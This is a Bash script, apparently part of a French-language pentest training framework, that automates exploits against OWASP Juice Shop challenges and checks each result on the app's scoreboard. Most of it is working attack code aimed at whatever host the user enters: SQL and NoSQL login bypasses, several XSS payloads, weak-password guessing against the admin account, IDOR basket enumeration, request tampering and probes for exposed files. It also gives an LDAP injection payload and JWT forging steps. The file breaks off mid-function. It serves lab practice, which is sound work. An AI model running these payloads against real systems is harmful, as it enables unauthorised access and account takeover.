#!/bin/bash
# modules/labs/juiceshop/exploits_extended.sh - Ghost00ls Framework v8.0 FIXED
# 30+ Challenges automatisés OWASP Juice Shop AVEC VÉRIFICATION SCOREBOARD
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
CHALLENGES_LOG="${LOG_DIR}/challenges_solved.log"
mkdir -p "$LOG_DIR"

# ==========================
# Tracking des challenges
# ==========================

CHALLENGES_SOLVED=0
CHALLENGES_TOTAL=30

log_challenge() {
    local challenge_name="$1"
    local difficulty="$2"
    local status="$3"
    
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$difficulty] $challenge_name - $status" >> "$CHALLENGES_LOG"
    
    if [ "$status" = "SUCCESS" ]; then
        echo -e "${GREEN}✅ Challenge solved: $challenge_name${NC}"
        CHALLENGES_SOLVED=$((CHALLENGES_SOLVED + 1))
    fi
}

show_progress() {
    echo
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}🏆 Challenges résolus: $CHALLENGES_SOLVED / $CHALLENGES_TOTAL${NC}"
    
    local percentage=$((CHALLENGES_SOLVED * 100 / CHALLENGES_TOTAL))
    echo -e "${CYAN}📊 Progress: ${percentage}%${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ==========================
# FONCTIONS SCOREBOARD - CRITIQUE !
# ==========================

get_scoreboard() {
    local base_url="$1"
    curl -s "${base_url}/api/Challenges" 2>/dev/null
}

check_challenge_solved() {
    local base_url="$1"
    local challenge_key="$2"
    
    local scoreboard=$(get_scoreboard "$base_url")
    
    if [ -z "$scoreboard" ]; then
        echo "ERROR"
        return 1
    fi
    
    local solved=$(echo "$scoreboard" | jq -r ".data[] | select(.key==\"$challenge_key\") | .solved" 2>/dev/null)
    
    if [ "$solved" = "true" ]; then
        echo "SOLVED"
        return 0
    elif [ "$solved" = "false" ]; then
        echo "NOT_SOLVED"
        return 1
    else
        echo "NOT_FOUND"
        return 2
    fi
}

wait_for_challenge() {
    local base_url="$1"
    local challenge_key="$2"
    local timeout="${3:-10}"
    local elapsed=0
    
    echo -e "${YELLOW}⏳ Vérification scoreboard...${NC}"
    
    while [ $elapsed -lt $timeout ]; do
        local status=$(check_challenge_solved "$base_url" "$challenge_key")
        
        if [ "$status" = "SOLVED" ]; then
            echo -e "${GREEN}✅ Challenge validé dans Juice Shop !${NC}"
            return 0
        fi
        
        sleep 1
        elapsed=$((elapsed + 1))
    done
    
    echo -e "${YELLOW}⚠️ Challenge non validé automatiquement${NC}"
    return 1
}

show_all_solved() {
    local base_url="$1"
    local scoreboard=$(get_scoreboard "$base_url")
    
    echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║     Challenges résolus (Scoreboard)       ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
    echo
    
    local total=$(echo "$scoreboard" | jq '.data | length' 2>/dev/null)
    local solved=$(echo "$scoreboard" | jq '[.data[] | select(.solved==true)] | length' 2>/dev/null)
    
    echo -e "${CYAN}Total: $solved / $total challenges${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    echo "$scoreboard" | jq -r '.data[] | select(.solved==true) | "\(.difficulty)⭐ \(.name)"' 2>/dev/null | while read line; do
        echo -e "${GREEN}✓${NC} $line"
    done
    
    echo
}

# ==========================
# Fonctions utilitaires
# ==========================

get_base_url() {
    local IP PORT
    IP=$(get_host_ip)
    
    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [3000]: " PORT; PORT=${PORT:-3000}
    
    echo "http://${IP}:${PORT}"
}

# ==========================
# CATÉGORIE 1: INJECTION (8 challenges)
# ==========================

# Challenge 1: SQL Injection Login (⭐⭐)
challenge_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Login Admin (SQLi) ⭐⭐       ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: loginAdminChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    # Vérifier si déjà résolu
    local status=$(check_challenge_solved "$BASE" "loginAdminChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Login Admin (SQLi)" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] SQL Injection Login Bypass...${NC}\n"

    local payload='{"email":"'\'' or 1=1--","password":"x"}'
    
    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null)

    local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
    
    if [ "$token" != "null" ] && [ -n "$token" ]; then
        echo -e "${GREEN}✓ Token obtenu${NC}"
        
        if wait_for_challenge "$BASE" "loginAdminChallenge" 5; then
            log_challenge "Login Admin (SQLi)" "⭐⭐" "SUCCESS"
            echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
        else
            echo -e "${YELLOW}⚠️ Token obtenu mais challenge non validé${NC}"
            echo -e "${CYAN}💡 Ouvre: ${BASE}/#/score-board${NC}"
        fi
    else
        echo -e "${RED}❌ Échec${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 2: XSS Tier 1 (⭐)
challenge_xss_search() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: DOM XSS (Search) ⭐           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: domXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "domXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "DOM XSS" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS via Search...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "domXssChallenge" 5; then
        log_challenge "DOM XSS" "⭐" "SUCCESS"
        echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
        echo -e "${CYAN}URL: ${BASE}/#/search?q=${encoded}${NC}"
    else
        echo -e "${YELLOW}⚠️ Ouvre manuellement: ${BASE}/#/search?q=${encoded}${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 3: XSS Tier 2 - Bonus Payload (⭐⭐)
challenge_xss_bonus() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Bonus Payload XSS ⭐⭐        ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: xssBonusChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "xssBonusChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Bonus Payload" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS Bonus Payload...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)" onload="this.src+=\`\`">'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "xssBonusChallenge" 5; then
        log_challenge "Bonus Payload" "⭐⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    else
        echo -e "${YELLOW}⚠️ Challenge peut nécessiter une action manuelle${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 4: XSS Tier 3 - Client Side XSS (⭐⭐⭐)
challenge_xss_client() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Client Side XSS ⭐⭐⭐        ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: clientSideXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "clientSideXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Client Side XSS" "⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Client-side XSS attack...${NC}\n"
    echo -e "${CYAN}Target: Track Order page${NC}"
    echo -e "${CYAN}Vector: orderId parameter${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    
    echo -e "${GREEN}Payload à tester dans le navigateur${NC}"
    echo -e "${CYAN}URL: ${BASE}/#/track-result?id=${payload}${NC}"
    
    echo -e "\n${YELLOW}💡 Ce challenge nécessite une action manuelle${NC}"
    log_challenge "Client Side XSS" "⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 5: NoSQL Injection Tier 1 (⭐⭐⭐⭐)
challenge_nosql_login() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: NoSQL Injection ⭐⭐⭐⭐      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: noSqlCommandChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "noSqlCommandChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "NoSQL Injection" "⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] NoSQL Injection...${NC}\n"

    local payloads=(
        '{"email":{"$ne":null},"password":{"$ne":null}}'
        '{"email":{"$gt":""},"password":{"$gt":""}}'
    )

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Testing: $payload${NC}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            echo -e "${GREEN}✓ Token obtenu${NC}"
            
            if wait_for_challenge "$BASE" "noSqlCommandChallenge" 5; then
                log_challenge "NoSQL Injection" "⭐⭐⭐⭐" "SUCCESS"
                echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
                read -p "👉 Entrée..."
                return 0
            fi
        fi
    done
    
    echo -e "${YELLOW}⚠️ Challenge non validé automatiquement${NC}"
    read -p "👉 Entrée..."
}

# Challenge 6: XSS Tier 4 - Reflected XSS (⭐)
challenge_xss_reflected() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Reflected XSS ⭐              ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: reflectedXssChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "reflectedXssChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Reflected XSS" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Reflected XSS...${NC}\n"

    local payload='<script>alert("XSS")</script>'
    local encoded=$(urlenc "$payload")
    
    curl -s "${BASE}/rest/products/search?q=${encoded}" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "reflectedXssChallenge" 5; then
        log_challenge "Reflected XSS" "⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 7: API-only XSS (⭐⭐⭐)
challenge_xss_api() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: API-only XSS ⭐⭐⭐           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: persistedXssFeedbackChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "persistedXssFeedbackChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "API-only XSS" "⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] XSS via API endpoint...${NC}\n"

    local payload='<iframe src="javascript:alert(\`xss\`)">'
    local feedback_data="{\"captchaId\":0,\"captcha\":\"\",\"comment\":\"$payload\",\"rating\":5}"
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "persistedXssFeedbackChallenge" 5; then
        log_challenge "API-only XSS" "⭐⭐⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 8: LDAP Injection (⭐⭐⭐⭐⭐⭐)
challenge_ldap_injection() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: LDAP Injection ⭐⭐⭐⭐⭐⭐   ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: ldapChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "ldapChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "LDAP Injection" "⭐⭐⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] LDAP Injection attack...${NC}\n"

    echo -e "${YELLOW}💡 Ce challenge nécessite une configuration LDAP spécifique${NC}"
    echo -e "${CYAN}Payload exemple: *)(uid=*${NC}"
    
    log_challenge "LDAP Injection" "⭐⭐⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# ==========================
# CATÉGORIE 2: BROKEN AUTHENTICATION (5 challenges)
# ==========================

# Challenge 9: Password Strength (⭐⭐)
challenge_password_strength() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Password Strength ⭐⭐        ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: passwordStrengthChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "passwordStrengthChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Password Strength" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Testing weak passwords...${NC}\n"

    local weak_passwords=("admin123" "password" "123456")
    local test_email="admin@juice-sh.op"

    for pass in "${weak_passwords[@]}"; do
        echo -e "${CYAN}Testing: $pass${NC}"
        
        local payload="{\"email\":\"$test_email\",\"password\":\"$pass\"}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "$payload" 2>/dev/null)

        local token=$(echo "$resp" | jq -r '.authentication.token' 2>/dev/null)
        
        if [ "$token" != "null" ] && [ -n "$token" ]; then
            if wait_for_challenge "$BASE" "passwordStrengthChallenge" 5; then
                log_challenge "Password Strength" "⭐⭐" "SUCCESS"
                echo -e "\n${GREEN}🎯 Weak password found: $pass${NC}"
                read -p "👉 Entrée..."
                return 0
            fi
        fi
    done

    echo -e "${YELLOW}⚠️ Aucun mot de passe faible trouvé${NC}"
    read -p "👉 Entrée..."
}

# Challenge 10: Security Question (⭐)
challenge_security_question() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Reset Jim's Password ⭐      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: resetPasswordJimChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "resetPasswordJimChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Security Question" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Weak Security Question...${NC}\n"

    echo -e "${CYAN}Target: jim@juice-sh.op${NC}"
    echo -e "${CYAN}Security Answer: Samuel (Jim's brother)${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite une action manuelle${NC}"
    
    log_challenge "Security Question" "⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 11: JWT Cracking (⭐⭐⭐⭐⭐)
challenge_jwt_cracking() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Forge Admin JWT ⭐⭐⭐⭐⭐    ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: jwtTier1Challenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "jwtTier1Challenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "JWT Cracking" "⭐⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] JWT Token Manipulation...${NC}\n"

    echo -e "${CYAN}Steps:${NC}"
    echo "1. Login as any user"
    echo "2. Extract JWT token"
    echo "3. Crack secret (weak: 'secret')"
    echo "4. Forge admin token"
    
    echo -e "\n${YELLOW}💡 Ce challenge nécessite des outils externes (jwt_tool, hashcat)${NC}"
    log_challenge "JWT Cracking" "⭐⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 12: OAuth User Password (⭐⭐⭐)
challenge_oauth_password() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: OAuth Misconfiguration ⭐⭐⭐ ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: oauthUserPasswordChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "oauthUserPasswordChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "OAuth Misconfiguration" "⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] OAuth user enumeration...${NC}\n"

    local resp=$(curl -s "${BASE}/api/Users" 2>/dev/null)
    
    if echo "$resp" | jq -e '.data[] | select(.email | contains("google") or contains("oauth"))' >/dev/null 2>&1; then
        if wait_for_challenge "$BASE" "oauthUserPasswordChallenge" 5; then
            log_challenge "OAuth Misconfiguration" "⭐⭐⭐" "SUCCESS"
            echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# Challenge 13: Two Factor Auth (⭐⭐⭐⭐⭐)
challenge_2fa_bypass() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: 2FA Bypass ⭐⭐⭐⭐⭐         ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: twoFactorAuthUnsafeSecretStorageChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] 2FA Bypass techniques...${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite une action manuelle complexe${NC}"
    
    log_challenge "2FA Bypass" "⭐⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# ==========================
# CATÉGORIE 3: BROKEN ACCESS CONTROL (6 challenges)
# ==========================

# Challenge 14: Admin Section (⭐⭐)
challenge_admin_section() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Access Admin Section ⭐⭐    ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: adminSectionChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "adminSectionChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Admin Section" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Accès Admin Section...${NC}\n"

    # Login admin
    local login_resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"'\'' or 1=1--","password":"x"}' 2>/dev/null)
    
    local token=$(echo "$login_resp" | jq -r '.authentication.token' 2>/dev/null)
    
    if [ "$token" != "null" ] && [ -n "$token" ]; then
        echo -e "${GREEN}✓ Token admin obtenu${NC}\n"
        
        curl -s -H "Authorization: Bearer $token" \
            "${BASE}/rest/user/authentication-details" >/dev/null 2>&1
        
        if wait_for_challenge "$BASE" "adminSectionChallenge" 5; then
            log_challenge "Admin Section" "⭐⭐" "SUCCESS"
            echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
            echo -e "${CYAN}🔗 ${BASE}/#/administration${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# Challenge 15: View Basket (⭐⭐)
challenge_view_basket() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: View Another User Basket ⭐⭐ ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: basketAccessChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "basketAccessChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "View Basket" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] IDOR - Basket enumeration...${NC}\n"

    for id in {1..5}; do
        echo -e "${CYAN}Testing basket ID: $id${NC}"
        
        local resp=$(curl -s "${BASE}/rest/basket/${id}" 2>/dev/null)
        
        if echo "$resp" | jq -e '.data' >/dev/null 2>&1; then
            echo -e "${GREEN}  ✓ Basket $id accessible${NC}"
            
            if wait_for_challenge "$BASE" "basketAccessChallenge" 3; then
                log_challenge "View Basket" "⭐⭐" "SUCCESS"
                echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
                read -p "👉 Entrée..."
                return 0
            fi
        fi
    done

    read -p "👉 Entrée..."
}

# Challenge 16: Five Star Feedback (⭐⭐)
challenge_five_star() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Five Star Feedback ⭐⭐      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: feedbackChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "feedbackChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Five Star Feedback" "⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Manipulate feedback rating...${NC}\n"

    local feedback_data='{"captchaId":0,"captcha":"","comment":"Great!","rating":6}'
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "feedbackChallenge" 5; then
        log_challenge "Five Star Feedback" "⭐⭐" "SUCCESS"
        echo -e "${GREEN}🎯 Challenge résolu !${NC}"
    fi

    read -p "👉 Entrée..."
}

# Challenge 17: Forged Coupon (⭐⭐⭐⭐⭐⭐)
challenge_forged_coupon() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Forged Coupon ⭐⭐⭐⭐⭐⭐     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: forgedCouponChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Forge valid coupon code...${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite une analyse des coupons existants${NC}"
    
    log_challenge "Forged Coupon" "⭐⭐⭐⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 18: Manipulate Basket (⭐⭐⭐)
challenge_manipulate_basket() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Manipulate Basket ⭐⭐⭐      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: negativeOrderChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Basket quantity manipulation...${NC}\n"
    echo -e "${YELLOW}💡 Ce challenge nécessite une session authentifiée${NC}"
    
    log_challenge "Manipulate Basket" "⭐⭐⭐" "MANUAL"

    read -p "👉 Entrée..."
}

# Challenge 19: Access Log (⭐⭐⭐⭐)
challenge_access_log() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Access Log ⭐⭐⭐⭐           ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: accessLogDisclosureChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "accessLogDisclosureChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Access Log" "⭐⭐⭐⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access server logs...${NC}\n"

    local log_paths=(
        "/support/logs/access.log"
        "/ftp/access.log"
    )

    for path in "${log_paths[@]}"; do
        echo -e "${CYAN}Testing: ${BASE}${path}${NC}"
        
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${path}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            if wait_for_challenge "$BASE" "accessLogDisclosureChallenge" 5; then
                log_challenge "Access Log" "⭐⭐⭐⭐" "SUCCESS"
                echo -e "\n${GREEN}🎯 Challenge résolu !${NC}"
                read -p "👉 Entrée..."
                return 0
            fi
        fi
    done

    read -p "👉 Entrée..."
}

# ==========================
# CATÉGORIE 4: SENSITIVE DATA EXPOSURE (4 challenges)
# ==========================

# Challenge 20: Confidential Document (⭐)
challenge_confidential_doc() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  Challenge: Confidential Document ⭐     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Key: confidentialDocumentChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "confidentialDocumentChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}✅ Challenge déjà résolu !${NC}"
        log_challenge "Confidential Document" "⭐" "SUCCESS"
        read -p "👉 Entrée..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access confidential document...${NC}\n"

    local doc_url="${BASE}/ftp/acquisitions.md"
    
    local resp=$(curl -s -o /dev/null -w "%{http_code}" "$doc_url" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        if wait_for_challenge "$BASE" "confidentialDocumentChallenge" 5; then
            log_challenge "Confidential Document" "⭐" "SUCCESS"
            echo -e "${GREEN}🎯 Challenge résolu !${NC}"
        fi
    fi

    read -p "👉 Entrée..."
}

# Challenge 21: Exposed Metrics (⭐)
challenge_exposed_metrics() {
    clear
    banner
